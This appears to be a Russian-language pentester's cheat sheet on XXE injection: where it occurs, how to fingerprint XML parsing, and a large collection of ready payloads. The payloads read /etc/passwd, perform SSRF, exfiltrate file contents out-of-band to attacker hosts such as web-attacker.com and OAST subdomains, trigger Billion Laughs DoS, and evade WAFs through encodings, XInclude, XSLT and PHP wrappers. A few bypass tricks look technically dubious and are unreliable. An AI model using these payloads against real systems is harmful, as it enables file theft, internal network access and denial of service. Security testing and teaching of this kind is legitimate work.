
# 1.  Поиск плоскости уязвимости

### 1.1. Где может встречаться XXE?

XXE-уязвимости могут встречаться в любом месте, где происходит обработка XML-документов. Основные места:

- **Веб-приложения**: API, SOAP, RESTful сервисы, формы загрузки файлов.
- **Микросервисы**: Взаимодействие между сервисами через XML.
- **Конфигурационные файлы**: Обработка XML-конфигураций.
- **Подобные форматы:** SVG, XHTML, RSS, Atom, XAML, KML, WSDL, DocBook, DOCX, XLSX,
- **Интеграции**: Взаимодействие с внешними системами через XML (например, банковские системы, ERP).
- **Мобильные приложения**: Передача данных в XML-формате.

### 1.2. Как искать XXE?

- **Анализ входных данных**: Ищите места, где приложение принимает XML-документы.
- **Исследование запросов**: Проверяйте HTTP-запросы, содержащие XML (например, POST-запросы с ==Content-Type: `application/xml` или `text/xml`==).
- **Анализ ответов**: Ищите ошибки, связанные с обработкой XML (например, ошибки парсера).
- **Внедрение внешних сущностей в ответы:** При блокировке DTD можем получить ответ Entities are not allowed for security reasons"
- **Использование инструментов**: Используйте сканеры уязвимостей (Burp Suite, OWASP ZAP) для автоматического поиска XXE.

# 2.  Анализ уязвимости

#### 2.1. Определение типа XML-обработки

Перед началом тестирования необходимо определить, какой тип обработки XML поддерживаются:
- **DTD (Document Type Definition)**: Стандартный способ определения структуры XML.
- **XML Schema (XSD)**: Более современный и строгий способ валидации XML.
- **RELAX NG**: Альтернативный способ описания структуры XML.

#### 2.2. Анализ структуры XML-документа

**DTD**:
- Наличие блока `<!DOCTYPE ...>` с определением сущностей или правил.
```
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY test "Hello">
]>
<root>&test;</root>
```
- Если XML содержит такие конструкции, парсер, скорее всего, обрабатывает DTD.

**XML Schema (XSD):**
- Используется атрибут xsi:schemaLocation или xsi:noNamespaceSchemaLocation.
```
<?xml version="1.0"?>
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	  xsi:noNamespaceSchemaLocation="schema.xsd">
  <element>value</element>
</root>
```

**RELAX NG:**
- Менее распространен. Определяется через пространство имен `xmlns="http://relaxng.org/ns/structure/1.0"`.
```
<?xml version="1.0"?>
<element xmlns="http://relaxng.org/ns/structure/1.0">
  ...
</element> 
```

##### ==ДАЖЕ ПРИ ИСПОЛЬЗОВАНИЕ XSD ИЛИ RELAX NG МОЖЕТ ПОДДЕРЖИВАТЬСЯ DTD==

#### 2.3. Анализ ошибок парсера

Если DTD запрещен:
  - При отправке DTD-блока парсер вернет ошибку, например:
    `Error: DOCTYPE is disallowed.`

Если XSD используется:
  - Ошибки валидации будут связаны с нарушением структуры, например:
    `Invalid content: element 'xxx' is not expected.`

#### 2.4. Изучение документации и заголовков
- HTTP-заголовки:
  - Заголовки вроде Content-Type: application/xml или text/xml указывают на обработку XML.
- Документация API:
  - Если в API указаны XSD-схемы или требования к структуре данных, это помогает определить тип обработки.

#### Примеры реакций на разные типы обработки
| Тип обработки | Признаки                       | Вектор атаки                     |
| ------------- | ------------------------------ | -------------------------------- |
| DTD           | Обрабатывает <!ENTITY>, SYSTEM | Классический XXE, Billion Laughs |
| XSD           | Использует xsi:schemaLocation  | Внедрение внешних схем           |
| RELAX NG      | Пространство имен RelaxNG      | Мало уязвимо, если DTD отключен  |

#### Инструменты для автоматизации
- XXE-сканеры:
  - Инструменты вроде xxeinjector, XXExploiter автоматически проверяют реакцию на разные типы инъекций.
- Burp Suite:
  - Используйте плагины (например, "Collaborator") для отслеживания внешних запросов при тестировании XXE.

#### Ключевые выводы
1. Если парсер поддерживает DTD — возможны классические XXE-атаки.
2. XSD/RELAX NG чаще используются для валидации структуры, но иногда допускают внедрение внешних ресурсов.
3. Даже при отключенных DTD проверяйте, не обрабатываются ли сущности через другие механизмы (например, XInclude).


# 3. Виды атак

## 3.1. При видимой xxe

#### 3.1.1. Проверка реакции на DTD-инъекции

Внедрение простой внутренней сущности:
```
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe "TEST"> ]>
<root>&xxe;</root>
```
- Если в ответе появляется TEST, DTD разрешен.

Попытка загрузки внешней сущности:
```
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://attacker.com/payload"> ]>
<root>&xxe;</root>
```
- Если сервер отправляет запрос к attacker.com, внешние сущности разрешены.

##### Использование XXE для извлечения файлов
```
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [
		<!ENTITY xxe SYSTEM "file:///etc/passwd">
	]>
	<stockCheck>
		<productId>&xxe;</productId>
	</stockCheck>
```

##### Использование XXE для SSRF-атак
```
	<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
	<stockCheck>
		<foo>&xxe;</foo>
	</stockCheck>
```

#### 3.1.2. Проверка реакции на XSD-инъекции
XSD не поддерживает DTD напрямую, некоторые реализации XML-парсеров могут обрабатывать внешние сущности, если они включены. Это может привести к уязвимостям, аналогичным XXE.


Внедрение внешних сущностей (XXE)
```
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://attacker.com/payload"> ]>
<root>&xxe;</root>
```
- Если сервер отправляет запрос к `attacker.com`, это указывает на уязвимость.

Использование `xs:include` или `xs:import`
```
<xs:include schemaLocation="http://attacker.com/malicious.xsd"/>
```
- Если сервер загружает внешний XSD, это может быть уязвимостью.

Использование `xs:any`
```
<xs:any processContents="lax"/>
```
- Если сервер принимает произвольные элементы, это может быть уязвимостью.


#### 3.1.3. Проверка реакции на RELAX NG-инъекции
RELAX NG не поддерживает DTD, но некоторые реализации могут обрабатывать внешние сущности, если они включены.

Внедрение внешних сущностей (XXE)
```
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://attacker.com/payload"> ]>
<root>&xxe;</root>
```
- Если сервер отправляет запрос к `attacker.com`, это указывает на уязвимость.

Использование внешних ссылок
RELAX NG поддерживает включение внешних ресурсов с помощью элементов `<externalRef>`.
```
<externalRef href="http://attacker.com/malicious.rng"/>
```
- Если сервер загружает внешний RELAX NG-файл, это может быть уязвимостью.

#### 3.1.4. Общие уязвимости для XSD и RELAX NG

**Инъекции в значения атрибутов**
Если значения атрибутов не проверяются должным образом, злоумышленник может внедрить вредоносный код.

Внедрить специальные символы или скрипты
```
<element attribute="value"><![CDATA[<script>alert(1)</script>]]></element>
```
- Если сервер интерпретирует внедренный код, это указывает на уязвимость.

**Обработка больших файлов**
Неправильная обработка больших XML-файлов может привести к атакам типа "отказ в обслуживании" (DoS).

**Неправильная обработка пространств имен**

Использовать нестандартные пространства имен:
```
<ns:element xmlns:ns="http://attacker.com/malicious">
    <ns:child>data</ns:child>
</ns:element>
```



## 3.2. При blind xxe

#### 3.2.1. Проверка реакции на DTD-инъекции

##### Обнаружение слепого XXE с использованием внеполосных (OAST) методов

###### Простая
```
<!DOCTYPE stockCheck [ 
	<!ENTITY xxe SYSTEM "http://5ouc2phowsd0prsgox25a7psljraf23r.oastify.com"> 
]>
<root>&xxe;</root>
```

###### Сущности параметров XML
```
<!DOCTYPE foo [ 
	<!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> 
	%xxe; 
]>
```

###### Сущности параметров XML с полезной нагрузкой
```
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> 

%eval; 
%exfiltrate;
```

```
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % end "]]>">
  <!ENTITY % wrapper "<!ENTITY &#x25; send SYSTEM 'https://YOUR-SUBDOMAIN.oast.pro/?data=%start;%file;%end;'>">
  %wrapper;
]>
<root>&send;</root>
```
**Объяснение payload**
- `%file` — читает файл `/etc/passwd`.
- `%start` и `%end` — обрамляют данные в `CDATA`, чтобы избежать ошибок парсера из-за спецсимволов.
- `%wrapper` — создает сущность `%send`, которая отправляет содержимое файла на ваш сервер через URL-параметр `data`.

## 3.3. Экзотические

- Уязвимость может быть возможна даже при отключенных внешних сущностях, если парсер XML обрабатывает DTD (Document Type Definition) и разрешает использование внутренних сущностей, параметрических сущностей или других функций DTD
#### 1. Атака "Billion Laughs" (DoS через расширение сущностей)
Эта атака использует вложенные внутренние сущности для создания экспоненциального расширения данных, что приводит к отказу в обслуживании (DoS).
```
<?xml version="1.0"?>
<!DOCTYPE example [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<example>&lol3;</example>
```
Результат: Парсер пытается обработать &lol3;, что приводит к экспоненциальному росту данных (миллиарды символов "lol"), потребляя ресурсы сервера.

#### 2. Использование параметрических сущностей и локальных DTD
Если парсер обрабатывает DTD и разрешает параметрические сущности, можно использовать локальные DTD-файлы для обхода ограничений. Например:
```
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```
Как это работает:
1. Загружается локальный DTD-файл (`local_dtd`).
2. Переопределяется сущность ISOamso из этого файла.
3. Внедряется код для чтения файла /etc/passwd через создание ошибки (попытка загрузить несуществующий путь, содержащий данные из файла).

#### 3. Чтение локальных файлов через внутренние сущности (если разрешено)
Некоторые парсеры разрешают доступ к локальным файлам через file://, даже если внешние сущности отключены
```
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<test>&file;</test>
```
Условие: Если парсер не блокирует доступ к локальным файлам через file://, содержимое /etc/passwd может быть возвращено в ответе.


# 4. Обход защит от атаки

#### 4.1. XInclude (XML Inclusions)
Механизм для включения внешних ресурсов или фрагментов данных в XML-документы.

- Если парсер обрабатывает XInclude и не настроен безопасно, это может быть использовано для атак, похожих на XXE (XML External Entity), даже если обработка DTD и внешних сущностей отключена.

- XInclude не требует DTD для работы, поэтому часто остается активным, когда DTD отключены.

**Как проверить уязвимость к XInclude?**
1. Внедрите тег `<xi:include>`:
   Отправьте XML с включением внешнего ресурса (например, файла или URL):

Пример чтения файла `/etc/passwd`:
```
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```
 Атрибут parse определяет, как обрабатывать содержимое:
   - parse="text" — вставить как текст.
   - parse="xml" — интерпретировать как XML (может привести к повторным инъекциям).

#### 4.2. Использование локальных DTD-файлов
Некоторые XML-парсеры позволяют использовать локальные DTD-файлы, даже если внешние сущности отключены. Это может быть использовано для создания параметрических сущностей и выполнения атак.

#### 4.3. Использование XSLT
XSLT (Extensible Stylesheet Language Transformations) — это язык для преобразования XML-документов. Если XSLT не настроен безопасно, это может быть использовано для атак, похожих на XXE.

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:import href="http://attacker.com/malicious.xsl"/>
</xsl:stylesheet>
```

#### 4.4. Обход WAF

- Base64-кодировку
```
<!DOCTYPE foo [
  <!ENTITY % payload SYSTEM "data:;base64,ZmlsZTovLy9ldGMvcGFzc3dk">
]>
```
Здесь `ZmlsZTovLy9ldGMvcGFzc3dk` — это `file:///etc/passwd` в Base64.

- Hex-кодировку
```
<!ENTITY % ext SYSTEM "ht&#x74;p://evil.com">
```

- Разделение атаки через параметрические сущности
```
<!DOCTYPE foo [
  <!ENTITY % part1 "SY">
  <!ENTITY % part2 "STEM">
  <!ENTITY % combined "%part1;%part2;">
  <!ENTITY % payload SYSTEM "file:///etc/passwd">
]>
```

- Внедрение данных через CDATA может помочь скрыть вредоносные сущности
```
<data><![CDATA[<!ENTITY % xxe SYSTEM "file:///etc/passwd">]]></data>
```

#### 4.5. Атаки без явного определения сущностей

- XInclude (XML Inclusions)
```
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

- Эксплуатация ошибок парсера. Некоторые парсеры (например, старые версии libxml2) имеют уязвимости, позволяющие читать файлы без DTD:
```
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="file:///etc/passwd"/>
</svg>
```

- Атаки через XML Schema (XSD)
```
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:import schemaLocation="http://evil.com/malicious.xsd"/>
</xs:schema>
```

#### 4.6. Использование нестандартных протоколов

- PHP-обертки
```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
```

- FTP/GOPHER
```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "ftp://evil.com:21/file.txt">
]>
```

#### 4.7. Использование других форматов данных

- Подмена Content-Type
```
POST /api HTTP/1.1
Content-Type: application/json

{"data": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"}
```

#### [репозиторий на гите с payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)